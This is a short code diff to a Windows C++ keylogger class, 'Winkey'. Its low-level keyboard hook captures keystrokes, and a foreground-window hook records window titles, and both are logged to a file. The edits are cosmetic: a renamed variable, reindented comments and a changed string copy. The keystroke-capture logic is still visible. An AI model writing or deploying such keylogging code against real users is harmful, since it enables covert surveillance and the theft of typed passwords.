@@ -100,19 +100,19 @@ void CALLBACK Winkey::winEventProc(
     _currentWindow = hwnd;
     if (event == EVENT_SYSTEM_FOREGROUND) {
         wchar_t windowTitle[TW_WINTITLE_MAX] = {};
-        int res = GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));
+        int result = GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));
 
-        if (res > 0) {
+        if (result > 0) {
             // Sanitize the window title
-            for (int i = 0 ; i < res ; ++i)
+            for (int i = 0 ; i < result ; ++i)
                 if (!isPrintable(windowTitle[i])) windowTitle[i] = L'?';
 
             /*
-            * Save the current window title to log it later
-            *
-            * We will not use the result of GetWindowTextW to determine the length
-            *  as it for some reason did truncate our final string
-            */
+             * Save the current window title to log it later
+             *
+             * We will not use the result of GetWindowTextW to determine the length
+             *  as it for some reason did truncate our final string
+             */
             memcpy(_windowTitle, windowTitle, TW_WINTITLE_MAX);
         }
     }
@@ -227,7 +227,7 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
             memcpy(_keyStroke, buffer, TW_KEYSTROKE_MAX);
         else {
             std::wstring    keyName = getKeyName(p->vkCode);
-            memcpy(_keyStroke, keyName.c_str(), TW_KEYSTROKE_MAX);
+            memcpy(_keyStroke, &keyName[0], TW_KEYSTROKE_MAX);
         }
 
         logToFile();
